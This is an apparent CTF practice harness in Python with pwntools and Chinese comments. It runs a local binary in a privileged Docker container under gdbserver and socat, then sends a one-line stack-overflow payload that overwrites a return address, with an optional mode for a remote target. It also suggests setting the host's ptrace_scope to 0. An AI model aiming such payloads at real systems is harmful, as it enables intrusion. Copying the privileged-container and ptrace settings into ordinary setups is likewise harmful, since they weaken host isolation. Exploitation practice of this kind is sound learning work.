#!/usr/bin/env python3
from pwn import *
import subprocess
import os
import time

# ================= 配置区域 =================
IMAGE_NAME = "roderickchan/debug_pwn_env:16.04-2.23-0ubuntu11.3-20240412"
CONTAINER_NAME = "pwn_debug_env"
LOCAL_DIR = os.getcwd()  # 当前目录
CONTAINER_DIR = "/home/ctf/hacker"  # 容器内映射目录
BINARY_NAME = "./overflow"  # 目标二进制文件名（通用）
GDB_PORT = 9999  # 调试端口
GDB_ATTACH_PORT = 9998  # 动态attach调试端口
TARGET_PORT = 12345  # 目标程序监听端口
TARGET_MODE = "remote"  # "gdb" 或 "remote" 或 "pwn"
REMOTE_IP = ""
REMOTE_PORT = 0
context(os = 'linux',arch = 'amd64', log_level = 'info')
# ===========================================

# ================= Exploit类封装 =================
class PwnExploit:
    """PWN Exploit封装类"""
    
    def __init__(self, connection):
        self.p = connection
        self.payload = None
    
    def setup_debugging(self):
        """设置并启动GDB调试"""
        log.info("正在准备gdb attach调试...")
        attach_result = gdb_attach_process()
        
        if attach_result:
            gdb_result = start_attach_gdb()
            if gdb_result:
                log.info("GDB attach已启动，程序已暂停")
                log.info("请在GDB中设置断点并继续执行")
                input("设置完断点后，按Enter继续执行exploit...")
                return True
            else:
                log.warning("启动GDB失败，但继续执行exploit...")
                return False
        else:
            log.warning("GDB attach失败，但继续执行exploit...")
            return False
    
    def run_exploit(self):
        debug_result = self.setup_debugging()
        
        self.p.sendafter(b"input:", b"A" * 0x20 + b"B" * 8 + p64(0x400676))
        self.p.interactive()

# 清理现有容器
def cleanup_container():
    try:
        subprocess.run(
            ["docker", "rm", "-f", CONTAINER_NAME],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        log.info(f"已清理旧容器: {CONTAINER_NAME}")
    except subprocess.CalledProcessError:
        pass  # 容器不存在是正常情况
    except Exception as e:
        log.error(f"清理容器时发生异常: {e}")

# 启动容器
def start_container():
    try:
        cleanup_container()
        subprocess.run([
            "docker", "run", "-d", "--rm",
            "--name", CONTAINER_NAME,
            "--privileged",                         # 使用特权模式，完全绕过安全限制
            "--cap-add", "SYS_PTRACE",              # 添加ptrace权限
            "-p", f"{GDB_PORT}:{GDB_PORT}",         # 端口映射
            "-p", f"{GDB_ATTACH_PORT}:{GDB_ATTACH_PORT}",  # attach调试端口映射
            "-p", f"{TARGET_PORT}:{TARGET_PORT}",   # 目标程序端口映射
            "-v", f"{LOCAL_DIR}:{CONTAINER_DIR}",   # 目录映射
            "--workdir", CONTAINER_DIR,             # 工作目录
            IMAGE_NAME,
            "tail", "-f", "/dev/null"               # 保持容器运行
        ], check=True)
        log.success(f"容器已启动: {CONTAINER_NAME}")
    
        
    except Exception as e:
        log.error(f"启动容器时发生异常: {e}")
        cleanup_container()
        raise

# 在容器内启动 gdbserver
def start_gdbserver():
    try:
        gdbserver_cmd = [
            "docker", "exec", "-it", "-d", CONTAINER_NAME,
            "sh", "-c",
            f"gdbserver --once 0.0.0.0:{GDB_PORT} {os.path.join(CONTAINER_DIR, BINARY_NAME)}"
        ]
        
        subprocess.Popen(gdbserver_cmd)
        log.info(f"gdbserver 启动于容器端口 {GDB_PORT}")
        
        time.sleep(2)
        
        check_cmd = [
            "docker", "exec", CONTAINER_NAME,
            "netstat", "-ln"
        ]
        result = subprocess.run(check_cmd, capture_output=True, text=True)
        if f":{GDB_PORT}" in result.stdout:
            log.success(f"gdbserver 已成功监听端口 {GDB_PORT}")
        else:
            log.warning("gdbserver 端口监听状态未确认")
            
    except Exception as e:
        log.error(f"启动 gdbserver 时发生异常: {e}")
        cleanup_container()
        raise

# 检查gdbserver状态
def check_gdbserver_status():
    try:
        check_process_cmd = [
            "docker", "exec", CONTAINER_NAME,
            "ps", "aux"
        ]
        result = subprocess.run(check_process_cmd, capture_output=True, text=True)
        if "gdbserver" in result.stdout:
            log.success("gdbserver 进程正在运行")
        else:
            log.error("gdbserver 进程未找到")
            
        check_port_cmd = [
            "docker", "exec", CONTAINER_NAME,
            "netstat", "-tlnp"
        ]
        result = subprocess.run(check_port_cmd, capture_output=True, text=True)
        if f":{GDB_PORT}" in result.stdout:
            log.success(f"端口 {GDB_PORT} 正在监听")
        else:
            log.error(f"端口 {GDB_PORT} 未在监听")
            
    except Exception as e:
        log.error(f"检查gdbserver状态时发生异常: {e}")

# 启动本地 GDB 调试器
def start_gdb():
    try:
        local_binary = BINARY_NAME
        
        gdb_cmd = (
            f"gdb -q "
            f"-ex 'set pagination off' "
            f"-ex 'set confirm off' "
            f"-ex 'set print pretty on' "
            f"-ex 'file {local_binary}' "
            f"-ex 'target extended-remote localhost:{GDB_PORT}' "
            f"-ex 'b main' "
        )
        
        log.info("正在启动GDB调试器...")
        
        subprocess.Popen([
            "wt.exe", "-w", "0", "nt", "wsl.exe", "bash", "-c", gdb_cmd
        ])
        log.success("GDB 调试器已在新终端中启动")
        
    except Exception as e:
        log.error(f"启动 GDB 调试器时发生异常: {e}")
        cleanup_container()
        raise

# 在容器内启动目标程序监听端口（模拟远程）
def start_target_server():
    try:
        binary_path = os.path.join(CONTAINER_DIR, BINARY_NAME)
        socat_cmd = [
            "docker", "exec", "-d", CONTAINER_NAME,
            "socat", f"TCP-LISTEN:{TARGET_PORT},reuseaddr,fork", f"EXEC:{binary_path}"
        ]
        
        subprocess.Popen(socat_cmd)
        log.info(f"目标程序已通过socat在容器端口 {TARGET_PORT} 监听")
        
        time.sleep(3)
        
        check_port_cmd = [
            "docker", "exec", CONTAINER_NAME,
            "netstat", "-tlnp"
        ]
        result = subprocess.run(check_port_cmd, capture_output=True, text=True)
        if f":{TARGET_PORT}" in result.stdout:
            log.success(f"端口 {TARGET_PORT} 正在监听")
        else:
            log.error(f"端口 {TARGET_PORT} 未在监听")
            
    except Exception as e:
        log.error(f"启动目标服务时发生异常: {e}")
        cleanup_container()
        raise

# 获取目标进程PID
def get_target_pid():
    try:
        # 查找正在运行的目标程序进程
        find_pid_cmd = [
            "docker", "exec", CONTAINER_NAME,
            "pgrep", "-f", BINARY_NAME.replace("./", "")
        ]
        result = subprocess.run(find_pid_cmd, capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout.strip():
            all_pids = result.stdout.strip().split('\n')
            
            # 过滤出真正的目标二进制文件进程，排除socat进程
            target_binary = BINARY_NAME.replace("./", "")
            target_pid = None
            
            for pid in all_pids:
                # 获取每个PID的详细命令行信息
                cmdline_cmd = ["docker", "exec", CONTAINER_NAME, "cat", f"/proc/{pid}/cmdline"]
                try:
                    cmdline_result = subprocess.run(cmdline_cmd, capture_output=True, text=True)
                    if cmdline_result.returncode == 0:
                        cmdline = cmdline_result.stdout.replace('\x00', ' ').strip()
                        
                        # 如果命令行直接包含目标二进制文件路径且不包含socat，则这是我们要的进程
                        if target_binary in cmdline and "socat" not in cmdline:
                            target_pid = pid
                            log.info(f"找到目标二进制进程PID: {pid}")
                            break
                except:
                    continue
            
            if target_pid:
                return target_pid
            else:
                # 如果没有找到纯二进制进程，使用第一个PID作为fallback
                log.warning("未找到纯二进制进程，使用第一个匹配的PID")
                pid = all_pids[0]
                return pid
        else:
            log.error("未找到目标进程")
            return None
    except Exception as e:
        log.error(f"获取进程PID时发生异常: {e}")
        return None

# 使用gdbserver attach到运行中的进程
def gdb_attach_process():
    try:
        pid = get_target_pid()
        if not pid:
            log.error("无法获取目标进程PID，无法attach")
            return False
        
        log.info(f"正在使用gdbserver attach到进程 {pid}")
        
        # 启动gdbserver attach到进程
        gdbserver_attach_cmd = [
            "docker", "exec", "-d", CONTAINER_NAME,
            "gdbserver", "--once", f"0.0.0.0:{GDB_ATTACH_PORT}", "--attach", pid
        ]
        
        # 检查容器权限状态
        log.info("检查容器权限状态...")
        
        # 检查ptrace权限
        ptrace_check_cmd = ["docker", "exec", CONTAINER_NAME, "cat", "/proc/sys/kernel/yama/ptrace_scope"]
        try:
            ptrace_result = subprocess.run(ptrace_check_cmd, capture_output=True, text=True)
            if ptrace_result.returncode == 0:
                ptrace_scope = ptrace_result.stdout.strip()
                if ptrace_scope == "0":
                    log.success("ptrace权限正常")
                else:
                    log.warning(f"ptrace权限受限 (ptrace_scope={ptrace_scope})")
        except Exception:
            pass
        
        process = subprocess.Popen(gdbserver_attach_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # 等待gdbserver启动
        time.sleep(1)
        
        # 检查gdbserver进程是否启动成功
        check_process_cmd = [
            "docker", "exec", CONTAINER_NAME,
            "ps", "aux"
        ]
        ps_result = subprocess.run(check_process_cmd, capture_output=True, text=True)
        
        if "gdbserver" in ps_result.stdout:
            log.success("gdbserver进程已启动")
        else:
            log.error("gdbserver进程未找到")
            
            # 尝试直接运行gdbserver来获取错误信息
            log.info("尝试直接运行gdbserver获取错误信息...")
            direct_gdbserver_cmd = [
                "docker", "exec", CONTAINER_NAME,
                "gdbserver", "--once", f"0.0.0.0:{GDB_ATTACH_PORT}", "--attach", pid
            ]
            try:
                direct_result = subprocess.run(direct_gdbserver_cmd, capture_output=True, text=True, timeout=3)
                
                # 分析具体的错误信息
                if "ptrace" in direct_result.stderr.lower():
                    log.error("ptrace权限被拒绝")
                    log.info("建议：在宿主机上运行 'echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope'")
                elif "permission denied" in direct_result.stderr.lower():
                    log.error("权限不足")
                elif "cannot attach" in direct_result.stderr.lower():
                    log.error("无法attach到目标进程")
                    
            except subprocess.TimeoutExpired:
                pass
            except Exception:
                pass
                
            # 提供解决方案建议
            log.info("可能的解决方案：")
            log.info("1. 在宿主机执行：sudo sysctl kernel.yama.ptrace_scope=0")
            log.info("2. 或者以root权限运行容器")
            log.info("3. 或者跳过调试，直接执行exploit")
        
        log.info(f"gdbserver attach已启动，监听端口 {GDB_ATTACH_PORT}")
        
        time.sleep(2)
        
        # 检查gdbserver是否成功监听
        check_cmd = [
            "docker", "exec", CONTAINER_NAME,
            "netstat", "-ln"
        ]
        result = subprocess.run(check_cmd, capture_output=True, text=True)
        
        if f":{GDB_ATTACH_PORT}" in result.stdout:
            log.success(f"gdbserver attach成功，监听端口 {GDB_ATTACH_PORT}")
            return True
        else:
            log.warning("gdbserver attach端口监听状态未确认")
            return False
            
    except Exception as e:
        log.error(f"gdbserver attach时发生异常: {e}")
        return False

# 启动GDB连接到attach的进程
def start_attach_gdb():
    try:
        local_binary = BINARY_NAME
        
        gdb_cmd = (
            f"gdb -q "
            f"-ex 'set pagination off' "
            f"-ex 'set confirm off' "
            f"-ex 'set print pretty on' "
            f"-ex 'file {local_binary}' "
            f"-ex 'target extended-remote localhost:{GDB_ATTACH_PORT}' "
        )
        
        log.info("正在启动GDB连接到attach的进程...")
        
        subprocess.Popen([
            "wt.exe", "-w", "0", "nt", "wsl.exe", "bash", "-c", gdb_cmd
        ])
        log.success("GDB attach调试器已在新终端中启动")
        return True
        
    except Exception as e:
        log.error(f"启动GDB attach调试器时发生异常: {e}")
        return False

# 封装 pwntools remote 连接与交互
def connect_and_interact():
    try:
        log.info("正在连接到目标程序...")
        p = remote("localhost", TARGET_PORT)
        log.success("已连接到目标程序")
        
        log.info("开始执行exploit...")
        # 使用新的PwnExploit类
        exploit = PwnExploit(p)
        try:
            exploit.run_exploit()
        except Exception as e:
            log.warning(f"Exploit执行过程中发生异常: {e}")
        p.close()
    except Exception as e:
        log.error(f"远程交互时发生异常: {e}")

# 保持向后兼容的exp_remote函数
def exp_remote(p):
    """远程exploit主函数 - 保持向后兼容"""
    exploit = PwnExploit(p)
    return exploit.run_exploit()

# 主调试/交互函数
def main():
    try:
        # 需要容器的模式
        start_container()
        
        if TARGET_MODE == "gdb":
            start_gdbserver()
            check_gdbserver_status()
            start_gdb()
            
            log.info("GDB 调试模式已启动")
            log.info("完成调试后，按Enter键退出...")
            input()
        elif TARGET_MODE == "remote":
            start_target_server()
            log.info("远程交互模式，目标程序已监听端口")
            connect_and_interact()
        elif TARGET_MODE == "pwn":
            log.info("PWN模式，直接执行exploit")
            p = remote(REMOTE_IP, REMOTE_PORT)
            exp_remote(p)
            p.interactive()
        else:
            log.error("未知模式，请检查 TARGET_MODE 配置")
            
        # 添加清理钩子
        import atexit
        atexit.register(cleanup_container)
        log.info("退出时将自动清理容器")
    except Exception as e:
        log.error(f"主流程发生异常: {e}")
        cleanup_container()
        import sys
        sys.exit(1)

# ================= 使用示例 =================
if __name__ == "__main__":
    context.log_level = "info"
    main()